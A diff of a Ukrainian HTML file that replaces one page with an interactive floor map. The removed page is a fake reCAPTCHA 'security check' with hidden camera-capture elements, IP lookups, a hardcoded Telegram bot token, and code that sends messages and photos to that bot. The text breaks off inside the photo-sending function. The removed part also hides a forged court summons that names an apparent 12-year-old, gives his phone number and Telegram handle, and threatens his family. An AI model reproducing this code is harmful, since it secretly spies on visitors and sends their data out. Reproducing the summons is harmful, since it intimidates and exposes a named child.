@@ -2,638 +2,658 @@
 <html lang="uk">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Перевірка безпеки</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
+    <title>Інтерактивна Карта Поверху</title>
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <style>
-        /* --- Стилі основної сторінки перевірки --- */
-        html, body {
+        /* Basic Reset & Body Styling */
+        html {
+            box-sizing: border-box;
             height: 100%;
+        }
+        *, *:before, *:after {
+            box-sizing: inherit;
+        }
+        body {
             margin: 0;
             padding: 0;
-            font-family: 'Open Sans', sans-serif;
-            background-color: #f0f2f5;
-            color: #333;
-            font-size: 16px;
-            line-height: 1.6;
-        }
-
-        #main-content {
-            min-height: 100%;
-            display: flex;
-            flex-direction: column;
-        }
-
-        header.site-header {
-            background-color: #4a5568;
-            color: #ffffff;
-            padding: 15px 20px;
-            min-height: 20px; /* Щоб хедер не зникав без тексту */
-            font-family: 'Roboto', sans-serif;
-            font-size: 1.3em;
-            font-weight: 600;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            flex-shrink: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-        }
-
-        main.site-content {
-            flex-grow: 1;
-            padding: 24px 16px;
-            background-color: #ffffff;
-            max-width: 700px;
+            overflow: hidden; /* Prevent scrollbars */
             width: 100%;
-            margin: 20px auto;
-            box-shadow: 0 1px 5px rgba(0,0,0,0.15);
-            border-radius: 8px;
-            box-sizing: border-box;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            background-color: #f0f0f0; /* Background for areas outside map */
+            overscroll-behavior: none; /* Prevent pull-to-refresh actions */
+            position: fixed; /* Prevent scrolling on iOS */
+        }
+
+        /* Map Container - Handles centering and positioning */
+        #map-container {
+            position: relative; /* Crucial for absolute positioning of children */
+            width: 100%;
+            height: 100%;
+            display: flex; /* Use flexbox for centering */
+            justify-content: center;
+            align-items: center;
+            background-color: #ffffff; /* Map background */
+        }
+
+        /* Map Image - Scales responsively */
+        #map-image {
+            display: block; /* Remove extra space below image */
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain; /* Scale while preserving aspect ratio */
+            user-select: none; /* Prevent image selection */
+            -webkit-user-drag: none; /* Prevent image dragging */
+            box-shadow: 0 0 15px rgba(0,0,0,0.2); /* Subtle shadow for depth */
+            background-color: #e0e0e0; /* Placeholder bg while loading */
+        }
+
+        /* Arrow Indicator */
+        #arrow {
+            position: absolute;
+            /* Start hidden until position is known and permission granted */
+            visibility: hidden;
+            width: 0;
+            height: 0;
+            /* Create triangle shape */
+            border-left: 11px solid transparent;    /* Half base width */
+            border-right: 11px solid transparent;   /* Half base width */
+            border-bottom: 22px solid rgba(220, 30, 30, 0.9); /* Red arrow */
+            /* Set rotation point to the bottom center (tip of the arrow) */
+            transform-origin: 50% 100%;
+            /* Smooth transitions */
+            transition: transform 0.18s linear, /* Faster rotation updates */
+                        top 0.4s ease-out,
+                        left 0.4s ease-out,
+                        visibility 0s linear 0.1s;
+            z-index: 10; /* Ensure arrow is above map and labels */
+            /* Initial position set by JS */
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -100%) rotate(0deg); /* Centered horizontally, tip at the point */
+            pointer-events: none; /* Don't interfere */
+            filter: drop-shadow(0px 1px 2px rgba(0,0,0,0.4)); /* Arrow shadow */
+        }
+
+        /* Room Labels */
+        .room-label {
+            position: absolute;
+            background-color: rgba(0, 60, 130, 0.8); /* Darker blue background */
+            color: white;
+            padding: 4px 8px; /* Slightly larger padding */
+            border-radius: 5px;
+            font-size: 10px; /* Base font size */
+            font-weight: bold;
+            white-space: nowrap; /* Prevent wrapping */
+            /* Center the label on its coordinates */
+            transform: translate(-50%, -50%) scale(1.0);
+            transform-origin: center center; /* Scale from center */
+            /* Smooth transition for scaling and color */
+            transition: transform 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275), /* Elastic scale */
+                        background-color 0.3s ease-in-out,
+                        opacity 0.5s ease,
+                        left 0s, /* No transition for position */
+                        top 0s;
+            z-index: 5; /* Below arrow, above map */
+            pointer-events: none; /* Don't interfere with map interaction */
+            opacity: 0; /* Start hidden until positioned */
+            box-shadow: 1px 1px 3px rgba(0,0,0,0.3);
             text-align: center;
         }
 
-        @media (min-width: 600px) {
-            main.site-content {
-                padding: 32px;
-                margin: 30px auto;
-            }
+        /* Highlighted State for Room Labels */
+        .room-label.highlighted {
+            transform: translate(-50%, -50%) scale(1.9); /* Scale up more */
+            background-color: rgba(210, 40, 40, 0.92); /* Brighter Red when highlighted */
+            z-index: 6; /* Bring slightly forward */
         }
 
-        main.site-content h1 {
-            color: #4a5568;
+        /* Modal for Permissions */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed;
+            z-index: 1000; /* Above everything */
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%;
+            max-width: 320px;
+            background-color: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            border-top: 5px solid #007bff;
+        }
+
+        .modal p {
             margin-top: 0;
             margin-bottom: 20px;
-            padding-bottom: 10px;
-            font-family: 'Roboto', sans-serif;
-            font-weight: 600;
-            font-size: 1.75em;
-            border-bottom: 1px solid #e6eaee;
-        }
-
-        main.site-content p {
-            margin-bottom: 16px;
-            font-size: 1em;
-            color: #444;
-            line-height: 1.7;
-        }
-
-        .info-section {
-            background-color: #edf2f7;
-            border-left: 4px solid #718096;
-            padding: 12px 16px;
-            margin: 20px 0 0 0; /* Змінено margin-top */
-            text-align: left;
-            border-radius: 0 4px 4px 0;
-            font-size: 0.95em; /* Перенесено з p всередині */
-        }
-
-        .info-section h2 { /* Цей селектор тепер не використовується */
-            color: #4a5568;
-            margin-top: 0;
-            margin-bottom: 8px;
-            font-size: 1.2em;
-        }
-
-        .info-section p {
-             margin-bottom: 8px; /* Зберігаємо для параграфів */
-             font-size: inherit; /* Наслідуємо розмір від батька */
-        }
-        .info-section a {
-            color: #4a5568;
-            font-weight: 600;
-            text-decoration: none;
-        }
-        .info-section a:hover {
-            text-decoration: underline;
-        }
-
-        footer.site-footer {
-            background-color: #2d3748;
-            color: #ddd;
-            text-align: center;
-            padding: 15px;
-            font-size: 0.85em;
-            border-top: 2px solid #718096;
-            flex-shrink: 0;
-        }
-
-        footer.site-footer .footer-links {
-            margin-top: 8px;
-        }
-
-        footer.site-footer a {
-            color: #cbd5e0;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-
-        footer.site-footer a:hover {
-            text-decoration: underline;
-        }
-
-        #action-message {
-            display: block;
-            position: fixed;
-            top: -100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #ffffff;
+            font-size: 16px;
+            line-height: 1.5;
             color: #333;
-            padding: 12px 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-            font-size: 0.95em;
-            z-index: 3000;
-            text-align: center;
-            transition: top 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            max-width: 90%;
-            box-sizing: border-box;
-            border-left: 4px solid #a0aec0;
+        }
+
+        .modal button {
+            padding: 12px 25px;
+            font-size: 16px;
             font-weight: 500;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            appearance: none; /* Remove default styles */
         }
-
-        #action-message.visible { top: 20px; }
-
-        .recaptcha-outer-container { display: flex; justify-content: center; margin-top: 25px; margin-bottom: 20px; }
-        .recaptcha-container { display: flex; align-items: center; padding: 12px 16px; border: 1px solid #d3d3d3; border-radius: 4px; background-color: #f9f9f9; box-shadow: 0 2px 5px rgba(0,0,0,0.1); width: auto; min-width: 310px; max-width: 400px; height: auto; box-sizing: border-box; cursor: default; font-family: 'Roboto', Arial, sans-serif; justify-content: space-between; position: relative; padding-bottom: 30px; transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out; }
-        .recaptcha-container:hover:not(.loading):not(.checked) { border-color: #b9b9b9; box-shadow: 0 3px 8px rgba(0,0,0,0.15); }
-        @media (max-width: 350px) { .recaptcha-container { min-width: 90%; max-width: 95%; } }
-        .recaptcha-left-side { display: flex; align-items: center; flex-grow: 1; margin-right: 15px; }
-        .recaptcha-checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 4px; background-color: #fff; margin-right: 12px; position: relative; cursor: pointer; transition: all 0.2s ease-in-out; flex-shrink: 0; overflow: hidden; }
-        .recaptcha-checkbox:hover:not(.loading):not(.checked) { border-color: #b1b1b1; box-shadow: 0 0 0 2px rgba(100, 116, 139, 0.1); }
-        .recaptcha-input { display: none; }
-        .recaptcha-label { font-size: 14px; color: #000; user-select: none; white-space: nowrap; }
-        .recaptcha-logo-section { display: flex; flex-direction: column; align-items: center; justify-content: flex-start; flex-shrink: 0; align-self: flex-start; margin-top: 2px; }
-        .recaptcha-logo-section img { width: 32px; height: 32px; display: block; }
-        .recaptcha-logo-name { font-size: 12px; color: #555; margin-top: 5px; font-family: 'Roboto', sans-serif; }
-        .recaptcha-links { position: absolute; bottom: 8px; right: 15px; font-size: 10px; color: #555; text-align: right; }
-        .recaptcha-links a { color: #555; text-decoration: none; }
-        .recaptcha-links a:hover { text-decoration: underline; }
-        .recaptcha-spinner { position: absolute; top: 50%; left: 50%; width: 24px; height: 24px; margin-top: -12px; margin-left: -12px; border: 3px solid #f3f3f3; border-top: 3px solid #718096; border-radius: 50%; box-sizing: border-box; animation: spin 1s linear infinite; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .recaptcha-checkmark { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; align-items: center; justify-content: center; }
-        .recaptcha-checkmark svg { width: 20px; height: 20px; stroke: white; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; fill: none; display: block; }
-        .recaptcha-container.loading .recaptcha-checkbox { background-color: #f9f9f9; border-color: #d3d3d3; cursor: default; }
-        .recaptcha-container.loading .recaptcha-spinner { display: block; }
-        .recaptcha-container.checked .recaptcha-checkbox { background-color: #48bb78; border-color: #48bb78; cursor: default; animation: checkmark-bg 0.3s ease-in-out; }
-        .recaptcha-container.checked .recaptcha-checkmark { display: flex; animation: checkmark-pop 0.3s ease-out; }
-        .recaptcha-container.checked .recaptcha-spinner { display: none; }
-        @keyframes checkmark-bg { from { background-color: #f9f9f9; border-color: #d3d3d3; } to { background-color: #48bb78; border-color: #48bb78; } }
-        @keyframes checkmark-pop { 0% { transform: scale(0.5); opacity: 0; } 70% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 1; } }
-
-        #video-preview, #canvas-capture { display: none; position: absolute; top: -9999px; left: -9999px; }
-
-        .progress-container { width: 100%; height: 5px; background: #e6eaee; position: relative; margin: 20px auto; border-radius: 5px; overflow: hidden; display: none; }
-        .progress-bar { height: 100%; width: 0%; background: #a0aec0; transition: width 0.5s ease; border-radius: 5px; }
-
-        /* .shield-icon { color: #718096; font-size: 2.5em; margin-bottom: 12px; display: inline-block; } */ /* Видалено */
-
-    </style>
-    <style>
-        /* --- Стилі для вмісту SUD.html --- */
-        /* Додано префікс .sud-scope до селекторів, щоб уникнути конфліктів */
-        .sud-scope * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
+        .modal button:hover, .modal button:focus {
+            background-color: #0056b3;
+            outline: none;
         }
-
-        /* Стиль для body SUD більше не потрібен, він буде наслідувати основний */
-
-        .sud-scope .document-container {
-            max-width: 100%; /* Займає всю доступну ширину */
-            margin: 0 auto; /* Центруємо, якщо є обмеження ширини */
-            padding: 20px; /* Збільшено відступи для кращого вигляду */
-            background-color: white;
-            position: relative; /* Для водяного знаку */
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; /* Зберігаємо оригінальний шрифт SUD */
-            color: #000;
-            line-height: 1.4;
-            font-size: 13px;
-             border: 1px solid #eee; /* Легка рамка для візуального відділення */
-             box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-             border-radius: 5px;
-        }
-
-         @media (min-width: 768px) {
-             .sud-scope .document-container {
-                 max-width: 800px; /* Обмежуємо ширину на великих екранах */
-             }
+         .modal button:active {
+             transform: scale(0.98);
          }
 
-
-        .sud-scope .header { border-bottom: 1px solid #ddd; padding-bottom: 12px; margin-bottom: 15px; text-align: center; }
-        .sud-scope .court-info { font-size: 10px; color: #333; line-height: 1.2; margin-bottom: 10px; }
-        .sud-scope .title { font-size: 15px; font-weight: bold; text-align: center; margin: 15px 0 2px 0; text-transform: uppercase; }
-        .sud-scope .subtitle { font-size: 13px; text-align: center; margin-bottom: 15px; }
-        .sud-scope .case-info { margin-bottom: 15px; display: flex; flex-direction: column; gap: 5px; font-size: 13px; }
-        .sud-scope .recipient { margin-bottom: 15px; font-size: 13px; }
-        .sud-scope .content { text-align: left; position: relative; font-size: 13px; }
-        .sud-scope .section { margin-bottom: 15px; }
-        .sud-scope .section h3 { font-size: 14px; margin: 15px 0 5px 0; font-weight: bold; }
-        .sud-scope hr { border: none; border-top: 1px solid #ddd; margin: 15px 0; }
-        .sud-scope .warning { background-color: #f8f8f8; padding: 10px; border-left: 3px solid #888; margin: 15px 0; font-size: 13px; }
-        .sud-scope .warning strong { text-decoration: underline; }
-        .sud-scope .articles { background-color: #f8f8f8; padding: 10px; border-left: 3px solid #888; font-size: 13px; }
-        .sud-scope .articles h3 { margin-top: 0; font-size: 14px; }
-        .sud-scope .articles p { margin: 8px 0; }
-        .sud-scope .signature-section { margin-top: 20px; font-size: 13px; }
-        .sud-scope .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 9px; color: #666; text-align: center; }
-        .sud-scope ul { margin: 5px 0 10px 20px; padding: 0; }
-        .sud-scope ul li { margin-bottom: 5px; }
-        .sud-scope p { margin: 8px 0; }
-        .sud-scope strong { font-weight: 600; }
-        @media screen and (max-width: 360px) {
-             /* Стилі SUD для малих екранів */
-            .sud-scope .title { font-size: 14px; }
-            .sud-scope .subtitle { font-size: 12px; }
-            .sud-scope .case-info, .sud-scope .recipient, .sud-scope .content, .sud-scope .warning, .sud-scope .articles { font-size: 12px; }
-            .sud-scope .section h3, .sud-scope .articles h3 { font-size: 13px; }
+        /* Debug Output */
+        #debug {
+            position: fixed;
+            bottom: 5px;
+            left: 5px;
+            background: rgba(0,0,0,0.65);
+            color: white;
+            padding: 5px 10px;
+            font-size: 10px;
+            border-radius: 4px;
+            z-index: 101;
+            max-width: calc(100% - 10px);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            opacity: 0.9;
         }
-        .sud-scope .document-number { font-size: 11px; color: #666; text-align: right; margin-bottom: 5px; }
-        .sud-scope .watermark {
-            position: fixed; /* Або absolute, якщо має бути всередині document-container */
+
+        /* Loading indicator (optional) */
+        #loading-indicator {
+            position: fixed;
             top: 50%;
             left: 50%;
-            transform: translate(-50%, -50%) rotate(-45deg);
-            font-size: 60px; /* Розмір водяного знаку */
-            color: rgba(200, 200, 200, 0.15); /* Трохи видніше */
-            white-space: nowrap;
-            pointer-events: none;
-            z-index: 0; /* Має бути під текстом */
-             opacity: 0.5; /* Додаткова прозорість */
+            transform: translate(-50%, -50%);
+            z-index: 1001; /* Above modal */
+            font-size: 18px;
+            color: #555;
+            padding: 15px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 8px;
+            display: none; /* Hidden by default */
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
-         /* Якщо watermark має бути всередині контейнера */
-         .sud-scope .document-container .watermark {
-             position: absolute;
-             z-index: 0;
-             font-size: 7vw; /* Адаптивний розмір */
-         }
     </style>
 </head>
 <body>
-    <!-- Анімоване повідомлення -->
-    <div id="action-message"></div>
+    <div id="map-container">
+        <!-- Використовуємо пряме посилання на зображення, надане вами -->
+        <img id="map-image"
+             src="https://i.ibb.co/63wnkPW/test.png"
+             alt="План поверху"
+             onerror="this.alt='Помилка завантаження карти'; console.error('Failed to load map image from: ' + this.src);"
+        >
 
-    <!-- Основна структура сайту (перевірка) -->
-    <div id="verification-content">
-        <header class="site-header" id="original-header">
-             <!-- Текст видалено -->
-        </header>
+        <div id="arrow"></div>
 
-        <main class="site-content" id="original-main">
-            <!-- <div class="shield-icon">🛡️</div> --> <!-- Видалено -->
-            <h1>Перевірка безпеки</h1>
-
-            <p>Для продовження роботи будь ласка, підтвердіть, що ви не робот, пройшовши розширену перевірку нижче. Це стандартна процедура для захисту персональних даних та підтвердження особи. Система виконує перевірку відповідно до вимог інформаційної безпеки.</p>
-
-            <!-- Прогрес-бар -->
-            <div class="progress-container" id="progress-container">
-                <div class="progress-bar" id="progress-bar"></div>
-            </div>
-
-            <!-- reCAPTCHA Clone Container -->
-            <div class="recaptcha-outer-container">
-                <div class="recaptcha-container" id="recaptcha-container">
-                    <div class="recaptcha-left-side">
-                        <div class="recaptcha-checkbox" id="recaptcha-checkbox" role="checkbox" aria-checked="false" tabindex="0" aria-labelledby="recaptcha-label">
-                            <div class="recaptcha-spinner"></div>
-                            <div class="recaptcha-checkmark">
-                                <svg viewBox="0 0 24 24"><path d="M20 6 L9 17 L4 12"></path></svg>
-                            </div>
-                        </div>
-                        <label class="recaptcha-label" id="recaptcha-label">Я не робот</label>
-                    </div>
-                    <div class="recaptcha-logo-section">
-                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
-                        <div class="recaptcha-logo-name">reCAPTCHA</div>
-                    </div>
-                    <div class="recaptcha-links">
-                        <a href="https://policies.google.com/privacy" target="_blank">Конфіденційність</a> -
-                        <a href="https://policies.google.com/terms" target="_blank">Умови</a>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Пояснення під капчею видалено -->
-
-            <!-- Важлива інформація (переміщено сюди) -->
-            <div class="info-section">
-                <!-- <h2>Важлива інформація:</h2> --> <!-- Заголовок видалено -->
-                <p>Ваші дані обробляються конфіденційно та відповідно до Закону України "Про захист персональних даних". У разі виникнення питань, звертайтесь до <a href="#">служби підтримки</a> або за номером <a href="tel:0800561456">0 800 561 456</a>.</p>
-            </div>
-
-            <!-- Приховані елементи для камери -->
-            <video id="video-preview" playsinline></video>
-            <canvas id="canvas-capture"></canvas>
-        </main>
-
-        <footer class="site-footer" id="original-footer">
-            © 2023 Перевірка безпеки. Всі права захищено.
-            <div class="footer-links">
-                <a href="#">Умови використання</a>
-                <a href="#">Політика конфіденційності</a>
-                <a href="#">Контакти</a>
-            </div>
-        </footer>
+        <!-- ======================================================================== -->
+        <!-- === УВАГА! НАЛАШТУЙТЕ ЦІ КООРДИНАТИ ДЛЯ ВАШОЇ КАРТИ! === -->
+        <!-- === data-x = % від лівого краю; data-y = % від верхнього краю === -->
+        <!-- ======================================================================== -->
+        <div class="room-label" id="label-K201" data-room-id="K201 Їдальня" data-x="45" data-y="65">K201</div>
+        <div class="room-label" id="label-K202" data-room-id="K202" data-x="18" data-y="25">K202</div>
+        <div class="room-label" id="label-K203" data-room-id="K203" data-x="17" data-y="10">K203</div>
+        <div class="room-label" id="label-K204" data-room-id="K204" data-x="26" data-y="10">K204</div>
+        <div class="room-label" id="label-K205" data-room-id="K205" data-x="35" data-y="10">K205</div>
+        <div class="room-label" id="label-K206" data-room-id="K206" data-x="44" data-y="10">K206</div>
+        <div class="room-label" id="label-K207" data-room-id="K207" data-x="53" data-y="10">K207</div>
+        <div class="room-label" id="label-K208" data-room-id="K208" data-x="75" data-y="15">K208</div>
+        <div class="room-label" id="label-WC-M" data-room-id="K209 WC Чоловічий" data-x="70" data-y="38">WC Чол.</div>
+        <div class="room-label" id="label-WC-F" data-room-id="K210 WC Жіночий" data-x="70" data-y="48">WC Жін.</div>
+        <div class="room-label" id="label-WC-A" data-room-id="WC Доступний" data-x="60" data-y="40">WC Дост.</div>
+        <div class="room-label" id="label-K214" data-room-id="K214" data-x="70" data-y="65">K214</div>
+        <div class="room-label" id="label-K215" data-room-id="K215" data-x="65" data-y="75">K215</div>
+        <div class="room-label" id="label-K217" data-room-id="K217" data-x="60" data-y="70">K217</div>
+        <div class="room-label" id="label-K2" data-room-id="K2 Тех. прим." data-x="60" data-y="48">K2</div>
+        <div class="room-label" id="label-K21a" data-room-id="K21 Тех. прим. (верх)" data-x="60" data-y="43">K21</div>
+        <div class="room-label" id="label-K21b" data-room-id="K21 Тех. прим. (низ)" data-x="65" data-y="70">K21</div>
+        <div class="room-label" id="label-Exit-F" data-room-id="Вихід F" data-x="88" data-y="80">Вихід F</div>
+        <div class="room-label" id="label-Exit-G" data-room-id="Вихід G" data-x="88" data-y="30">Вихід G</div>
+        <div class="room-label" id="label-Exit-D" data-room-id="Вхід D" data-x="50" data-y="97">Вхід D</div>
+        <div class="room-label" id="label-Stairs" data-room-id="Сходи" data-x="40" data-y="30">Сходи</div>
+         <!-- ======================================================================== -->
+         <!-- === КІНЕЦЬ БЛОКУ КООРДИНАТ КІМНАТ === -->
+         <!-- ======================================================================== -->
     </div>
 
-    <!-- Прихований контейнер для вмісту SUD.html -->
-    <div id="sud-content" style="display: none;" class="sud-scope">
-        <!-- Вміст файлу SUD.html вставлено сюди -->
-        <div class="document-container">
-            <div class="watermark">КОПІЯ</div>
+    <div id="debug">Ініціалізація...</div> <!-- For debugging -->
 
-            <div class="header">
-                <div class="court-info">
-                    ТЕРНОПІЛЬСЬКИЙ РАЙОННИЙ СУД<br>
-                    ТЕРНОПІЛЬСЬКОЇ ОБЛАСТІ<br>
-                    вул. Князя Острозького, 14, м. Тернопіль, 46001<br>
-                    тел./факс: (0352) 52-15-00
-                </div>
-                <div class="document-number">Реєстр. №: СП-832/1092/25</div>
-            </div>
-
-            <div class="title">СУДОВА ПОВІСТКА</div>
-            <div class="subtitle">(запрошення до суду)</div>
-
-            <div class="case-info">
-                <div><strong>№ справи:</strong> 832/1092/25</div>
-                <div><strong>Дата видачі повістки:</strong> 08.04.2025</div>
-            </div>
-
-            <div class="recipient">
-                <p><strong>До:</strong> Тарнавський Максим<br>
-                <strong>Тел.:</strong> +380994123665 (Vodafone)<br>
-                <strong>Telegram:</strong> @FOREXpik</p>
-            </div>
-
-            <div class="content">
-                <p>Оскільки Ви є неповнолітнім, до Тернопільського районного суду Тернопільської області, що знаходиться за адресою:<br>
-                <strong>м. Тернопіль, вул. Князя Острозького, 14</strong>, зобов'язані з’явитися Ваші батьки або законні представники.</p>
-
-                <p><strong>Дата судового засідання:</strong> 17 квітня 2025 року<br>
-                <strong>Час:</strong> 10:30</p>
-
-                <p>Вас викликають у якості відповідача у справі про вчинення шахрайських дій в мережі Інтернет, а саме — шляхом виманювання коштів під виглядом продажу ігрової валюти (UC) у грі PUBG Mobile.</p>
-
-                <div class="section">
-                    <h3>Суть справи:</h3>
-                    <p>Національна поліція України, кібердепартамент, отримала офіційну заяву від громадянина Вишньовського Дмитра Григоровича (м. Тернопіль), в якій ідеться про факт шахрайства з боку Telegram-користувача @FOREXpik, яким, за результатами внутрішньої перевірки, є Ви — Максим Тарнавський.</p>
-
-                    <p>Заявник надав:</p>
-                    <ul>
-                        <li>скріншоти листування з нецензурними висловлюваннями з боку відповідача;</li>
-                        <li>особисте підтвердження переказу коштів у сумі, еквівалентній 2000 UC або 620 гривень;</li>
-                        <li>фотодокази, що підтверджують факт шахрайства.</li>
-                    </ul>
-
-                    <p>Також у заяві вказано, що відповідач є особою віком 12 років, що зафіксовано в матеріалах справи. <p>Оскільки Міша Тарнавський є неповнолітньою особою, відповідальність за його дії несуть його батьки згідно з чинним законодавством України. Згідно з наявними матеріалами справи, він зареєстрований у Запорізькій області.</p>Систематично вживав нецензурну лексику та ображав інших осіб, у тому числі заявника. Це може бути кваліфіковано також як порушення норм етики та моралі, передбачене відповідними статтями КУпАП нижче.</p>
-                </div>
-            </div>
-
-            <hr>
-
-            <div class="articles">
-                <h3>Статті, що можуть бути застосовані до справи:</h3>
-                <p><strong>Ст. 190 КК України</strong> — Шахрайство</p>
-                <p><strong>Ст. 173-1 КУпАП</strong> — Образа гідності особи та нецензурна лайка в публічному просторі інтернету.</p>
-                <p><strong>Ст. 185-1 КУпАП</strong> — Умисне невиконання законних вимог правоохоронних органів</p>
-            </div>
-
-            <hr>
-
-            <div class="warning">
-                <p>У разі неявки до суду без поважних причин, справа може бути розглянута без Вашої участі на підставі наданих доказів.</p>
-                <p><strong>Явка в суд — обов'язкова.</strong></p>
-
-                <p>Згідно з ч.1 ст. 135 КПК України, судова повістка надсилається не пізніше ніж за три доби до судового засідання. Повістка також надсилається рекомендованим листом та в електронній формі заявнику.</p>
-            </div>
-
-            <hr>
-
-            <div class="signature-section">
-                <p><strong></strong><br>
-                При отриманні заяви буде підписано Суддею Тернопільського районного суду<br>
-                Олександром П. Романчуком<br>
-                11.04.2025</p>
-            </div>
-
-            <div class="footer">
-                <p>ТРС 832/1092/25-П | Цей документ сформовано автоматизованою системою діловодства суду. Для перевірки автентичності зверніться до канцелярії суду.</p>
-            </div>
-        </div>
-        <!-- Кінець вставленого вмісту SUD.html -->
+    <div id="permission-prompt" class="modal">
+        <p>Щоб показувати ваш напрямок на карті, потрібен доступ до датчиків орієнтації вашого пристрою.</p>
+        <button id="grant-permission">Надати доступ</button>
     </div>
 
+     <div id="loading-indicator">Завантаження карти...</div>
 
     <script>
-        // --- !!! WARNING: SECURITY RISK !!! ---
-        const TELEGRAM_BOT_TOKEN = '7371661364:AAHKsgG_Bg7bnvktQVEomb3KC8WYxfO8_Yo';
-        const TELEGRAM_CHAT_ID = '6108652715';
-        // --- !!! END OF SECURITY WARNING !!! ---
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- DOM Elements ---
+            const mapContainer = document.getElementById('map-container');
+            const mapImage = document.getElementById('map-image');
+            const arrow = document.getElementById('arrow');
+            const roomLabelElements = document.querySelectorAll('.room-label');
+            const debugInfo = document.getElementById('debug');
+            const permissionPrompt = document.getElementById('permission-prompt');
+            const grantButton = document.getElementById('grant-permission');
+            const loadingIndicator = document.getElementById('loading-indicator');
 
-        const verificationContent = document.getElementById('verification-content'); // Основний контейнер перевірки
-        const originalHeader = document.getElementById('original-header');
-        const originalMain = document.getElementById('original-main');
-        const originalFooter = document.getElementById('original-footer');
-        const sudContent = document.getElementById('sud-content'); // Контейнер для SUD
+            // --- State Variables ---
+            let currentOrientation = 0; // Device heading (0-360 degrees, 0 = North)
+            let compassOffset = 0; // Manual offset if map North != true North
+            let orientationPermissionGranted = false;
+            let orientationFallbackUsed = false; // Flag if using relative orientation
 
-        const container = document.getElementById('recaptcha-container');
-        const checkbox = document.getElementById('recaptcha-checkbox');
-        const actionMessage = document.getElementById('action-message');
-        const videoElement = document.getElementById('video-preview');
-        const canvasElement = document.getElementById('canvas-capture');
-        const progressContainer = document.getElementById('progress-container');
-        const progressBar = document.getElementById('progress-bar');
+            // === SIMULATED POSITION ===
+            // !! IMPORTANT: This is NOT real-time tracking inside the building !!
+            // Start user near entrance D (adjust if needed)
+            let currentUserPosition = { xPercent: 50, yPercent: 95 }; // % of map container
+            const proximityThresholdPercent = 6; // % of map's smaller dimension
 
-        let isProcessing = false;
-        let messageTimeout = null;
-        let ipAddress = 'Визначається...';
+            let mapLoaded = false;
+            let mapRect = null; // Cached map dimensions and position
 
-        function showProgress(percent) {
-            progressContainer.style.display = 'block';
-            requestAnimationFrame(() => {
-                 requestAnimationFrame(() => { progressBar.style.width = `${percent}%`; });
-            });
-        }
-
-        function hideProgress() {
-            setTimeout(() => {
-                progressContainer.style.display = 'none';
-                progressBar.style.width = '0%';
-            }, 500);
-        }
-
-        async function getIPAddress() {
-            try {
-                const r1 = await fetch('https://api.ipify.org?format=json'); if (!r1.ok) throw 'err1'; return (await r1.json()).ip || 'N/A';
-            } catch (e) { try { const r2 = await fetch('https://ipinfo.io/json'); if (!r2.ok) throw 'err2'; return (await r2.json()).ip || 'N/A'; } catch (e2) { console.error("IP Fetch Error:", e, e2); return 'N/A'; }}
-        }
-
-        async function sendTelegramMessage(text) {
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) { console.error("TG Creds Missing"); return; }
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const payload = { chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
-            try { const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); if (!(await r.json()).ok) console.error("TG Send Error"); } catch (e) { console.error("TG Network Error:", e); }
-        }
-
-        async function sendTelegramPhoto(blob, caption = "") {
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) { console.error("TG Creds Missing"); return; }
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
